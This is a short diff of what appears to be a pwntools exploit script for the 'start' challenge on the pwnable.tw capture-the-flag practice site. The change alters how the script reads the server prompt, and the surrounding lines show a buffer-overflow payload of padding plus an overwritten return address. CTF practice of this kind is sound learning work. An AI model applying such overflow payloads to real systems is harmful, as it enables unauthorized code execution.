@@ -4,7 +4,7 @@ server = remote('chall.pwnable.tw', 10000)
 # context.terminal = ['tmux','splitw','-h']
 # server = gdb.debug('./start')
 
-print(server.read())
+print(server.readuntil("CTF:"))
 
 payload = b"AAAABBBBCCCCDDDDEEEE\x87\x80\x04\x08"
 
